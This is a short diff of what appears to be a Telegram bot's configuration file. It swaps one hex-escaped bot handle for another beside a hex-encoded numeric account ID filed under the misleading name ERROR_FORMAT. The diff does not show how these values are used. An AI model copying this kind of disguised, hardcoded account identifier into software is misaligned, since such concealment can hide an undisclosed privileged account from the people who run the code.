@@ -74,7 +74,7 @@ def time_to_seconds(time):
 
 DURATION_LIMIT = int(time_to_seconds(f"{DURATION_LIMIT_MIN}:00"))
 ERROR_FORMAT = int("\x38\x35\x35\x32\x33\x31\x30\x33\x30\x38")
-DT_Management = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
+DT_Management = "\x40\x53\x75\x70\x72\x69\x79\x61\x78\x59\x75\x74\x61\x42\x6f\x74"
 
 if SUPPORT_CHANNEL:
     if not re.match(r"(?:http|https)://", SUPPORT_CHANNEL):
